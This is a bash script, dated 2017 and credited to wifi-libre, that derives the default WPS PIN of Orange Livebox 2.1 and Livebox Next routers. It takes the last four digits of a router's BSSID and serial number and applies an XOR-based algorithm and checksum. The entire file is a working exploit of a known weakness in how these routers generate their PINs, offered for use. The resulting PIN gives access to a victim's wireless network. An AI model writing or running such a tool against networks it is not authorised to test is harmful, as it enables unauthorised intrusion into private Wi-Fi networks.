#! /bin/bash
version=1.1
# orangen.sh: Default pin generator for livebox 2.1 and livebox next
# Algorithm and vulnerability by wifi-libre. For more details check https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
# Contact script author: kcdtv@wifi-libre.com
# Copyleft (C) 2017 kcdtv @ www.wifi-libre.com

# Global variables:
grey="\033[0;37m"
orange="\033[38;5;202m"
white="\033[1;37m"
echo -e "
$orange  orangen$white.sh$grey: A simple bash PIN generator for$orange livebox 2.1$grey and$white Lievbox Next$grey

--------------------------------------------------------------------------------
"


until  [[ "$(echo $bssid | tr A-F a-f | egrep -o '^[0-9a-f]{4}' | wc -c)" == 5 ]];
  do
   echo -e "▐█ Entra los$white 4 últimos digítos$grey del$white bSSID$grey (sin los :) $orange"
   read -n 4 -ep "    " bssid
   echo -e "$grey"  
done
wan=$(printf "%X\n" $(( 0x$(echo $bssid) - 2 )))
until  [[ "$(echo $serial | egrep -o '^[0-9]{4}' | wc -c)" == 5 ]];
  do
   echo -e  "▐█ Entra los$white 4 últimos digítos$grey del$white número de serie$orange"
   read -n 4 -ep "    " serial
   echo -e "$grey"  
done
K1=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 2) + 0x$(echo $serial | cut -c 1)  + 0x$(echo $wan | cut -c 4) + 0x$(echo $wan | cut -c 3) )) | rev | cut -c 1)
K2=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 4) + 0x$(echo $serial | cut -c 3)  + 0x$(echo $wan | cut -c 2) + 0x$(echo $wan | cut -c 1) )) | rev | cut -c 1)
D1=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 4))) | cut -c 3)
D2=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 3))) | cut -c 3) 
D3=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 2))) | cut -c 3)
D4=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 3))) | cut -c 3) 
D5=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 4) ^ 0x$(echo $wan | cut -c 3))) | cut -c 3)
D6=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 3) ^ 0x$(echo $wan | cut -c 4))) | cut -c 3)
D7=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 2))) | cut -c 3)
conversion=$(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)
string=$(printf '%07d\n' $((conversion%10000000)))
accum=$(($(echo "$string" | cut -c 1) * 3 + $(echo "$string" | cut -c 2) + $(echo "$string" | cut -c 3) * 3 + $(echo "$string" | cut -c 4) + $(echo "$string" | cut -c 5) * 3 + $(echo "$string" | cut -c 6) + $(echo "$string" | cut -c 7) * 3))
checksum=$((((10 - $((accum%10))))%10))
echo -e " $white     PIN por defecto: $orange $string$checksum"
echo -e "$grey
Copyleft (C) 2017 kcdtv @ www.wifi-libre.com"
